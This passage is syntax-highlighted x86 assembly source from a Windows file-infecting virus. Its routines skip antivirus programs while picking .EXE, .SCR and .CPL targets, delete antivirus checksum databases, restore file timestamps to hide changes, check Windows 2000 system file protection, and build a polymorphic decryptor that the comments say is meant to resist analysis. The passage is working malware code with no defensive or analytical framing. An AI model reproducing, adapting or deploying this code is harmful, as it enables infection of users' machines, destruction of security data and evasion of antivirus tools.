                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'rd'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'on'</span><span class="sc0"> </span><span class="sc1">; Any antivirus?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">       </span><span class="sc1">; If it is, then jump to set carry flag</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
     </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; Check "V"s in the name</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'v'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">           </span><span class="sc1">; If any, set carry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">   </span><span class="sc1">; Check if the file is .EXE, .SCR or</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ItsOK</span><span class="sc0">         </span><span class="sc1">; .CPL. This is made because the per-</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rcs.'</span><span class="sc0">   </span><span class="sc1">; process functions have no mask to</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">         </span><span class="sc1">; search.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'lpc.'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">
      </span><span class="sc5">@@ItsOK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckFileName</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to convert the four character string in EDX to lowercase</span><span class="sc0">
</span><span class="sc5">ToLower</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Next</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
      </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@Loop_001</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ToLower</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function deletes the files AVP.CRC, ANTI-VIR.DAT, CHKLIST.MS and</span><span class="sc0">
</span><span class="sc1">;; IVB.NTZ, which are antivirus CRC databases.</span><span class="sc0">
</span><span class="sc5">DeleteDATs</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileDAT1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFile</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileDAT2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFile</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileDAT3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFile</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileDAT4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFile</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DeleteDATs</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to delete the file pointed by EBX</span><span class="sc0">
</span><span class="sc5">DeleteFile</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_DeleteFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DeleteFile</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FileDAT1</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP.CRC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileDAT2</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileDAT3</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKLIST.MS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileDAT4</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IVB.NTZ'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Function to save the timestamp of a file...</span><span class="sc0">
</span><span class="sc5">SaveDateTime</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FileDateTime_Common</span><span class="sc0">
</span><span class="sc5">SaveDateTime</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; ... and later restore it with this other function</span><span class="sc0">
</span><span class="sc5">RestoreDateTime</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">FileDateTime_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">RVA_GetFileTime</span><span class="sc4">]</span><span class="sc0">
                                </span><span class="sc1">; EAX = 0: GetFileTime</span><span class="sc0">
                                </span><span class="sc1">; EAX = 4: SetFileTime</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RestoreDateTime</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; If we are in Win2K, some files are protected by the operating system. Since</span><span class="sc0">
</span><span class="sc1">;; they aren't all the files in the harddisk (only the system ones), we only</span><span class="sc0">
</span><span class="sc1">;; have to check if a file is protected or not. For that thing that I do in</span><span class="sc0">
</span><span class="sc1">;; InfectFile, we need to load SFC.DLL, which have the protection APIs. If we</span><span class="sc0">
</span><span class="sc1">;; can't load that, then we aren't in Win2K, so we put 0 in the RVA-storage</span><span class="sc0">
</span><span class="sc1">;; variable to know that the function can't be called. Normally, under Win2K</span><span class="sc0">
</span><span class="sc1">;; this DLL is loaded always (like ADVAPI32.DLL), so we'll get the module</span><span class="sc0">
</span><span class="sc1">;; handle as if we call GetModuleHandleA. If not, then we load it :)</span><span class="sc0">
</span><span class="sc5">LoadSFCFunctions</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SFC_Dll</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleSFC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfSFCs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASC_SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@EndOfSFCs</span><span class="sc4">:</span><span class="sc0">                                                
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SfcIsFileProtected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; 0 or</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                                 </span><span class="sc1">; address</span><span class="sc0">
</span><span class="sc5">LoadSFCFunctions</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SFC_Dll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SFC.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HandleSFC</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_SfcIsFileProtected</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'SfcIsFileProtected'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; The only function we</span><span class="sc0">
</span><span class="sc5">RVA_SfcIsFileProtected</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; need</span><span class="sc0">

</span><span class="sc5">LoadIMAGEHLPFunctions</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IMAGEHLP_Dll</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleIMAGEHLP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfIMAGEHLPs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASC_CheckSumMappedFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@EndOfIMAGEHLPs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CheckSumMappedFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LoadIMAGEHLPFunctions</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IMAGEHLP_Dll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IMAGEHLP.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HandleIMAGEHLP</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_CheckSumMappedFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CheckSumMappedFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_CheckSumMappedFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;; This function creates a decryptor that fills the 40 free bytes at the be-</span><span class="sc0">
</span><span class="sc1">;;; ginning of the virus. That (shitty polymorphic) decryptor is made to avoid</span><span class="sc0">
</span><span class="sc1">;;; cryptanalisis. Moreover, this function gets some values for the later use</span><span class="sc0">
</span><span class="sc1">;;; of the TUAREG.</span><span class="sc0">
</span><span class="sc5">ModifyDumbDecryptor</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">@@AgainRnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AgainRnd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Get the decryption key for the</span><span class="sc0">
                                              </span><span class="sc1">; main encryption (TUAREG)</span><span class="sc0">
   </span><span class="sc5">@@AgainRnd2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AgainRnd2</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Get method: 0=ADD,</span><span class="sc0">
                                                       </span><span class="sc1">; 1=SUB, 2=XOR</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Inic_Virus</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc1">;; Let's use the TUAREG functions</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08080808h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SetIndex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SetCounter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@SetKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Garbage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomCalling</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc5">@@GetOtherType</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GetOtherType</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PutSUB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PutADD</span><span class="sc0">
      </span><span class="sc5">@@PutXOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0031h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next01</span><span class="sc0">
      </span><span class="sc5">@@PutADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next01</span><span class="sc0">
      </span><span class="sc5">@@PutSUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0029h</span><span class="sc0">
      </span><span class="sc5">@@Next01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next02</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
